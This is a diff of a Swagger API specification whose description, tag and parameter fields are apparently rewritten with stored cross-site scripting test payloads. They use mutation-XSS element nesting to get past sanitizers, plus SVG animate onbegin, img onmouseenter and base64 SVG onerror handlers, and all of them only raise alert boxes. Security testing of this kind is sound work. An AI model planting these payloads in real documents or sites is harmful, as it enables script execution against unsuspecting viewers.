@@ -1,7 +1,8 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><iframe src="data:image/svg+xml;base64,CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CiAgPGNpcmNsZSByPSIxMCIgY3g9IjEwIiBjeT0iMTAiIGZpbGw9ImdyZWVuIi8+CiAgPGltYWdlIGhyZWY9IngiIG9uZXJyb3I9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpIiAvPgo8L3N2Zz4="></iframe>">
+  description: <form><math><h1>BU0</h1><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
+    onbegin="alert('XSS1')"/><mtext><h1>BU1</h1><textarea><desc id="</textarea><math><mtext><h1>BU</h1>">
   version: production
 basePath: /JSSResource/
 produces:
@@ -19,14 +20,15 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - accounts
+        - accounts"><img/src=x onmouseenter="alert('Test XSS1')">
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><xss onmouseenter="alert('Test Stored XSS')" style=display:block>test</xss>"></form>
+            <form><math><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
+    onbegin="alert('XSS2')"/><mtext><textarea><path id="</textarea><xss onmouseenter="alert('Test XSS2')" style=display:block>test</xss>"></form>
 
           format: int64
           in: path
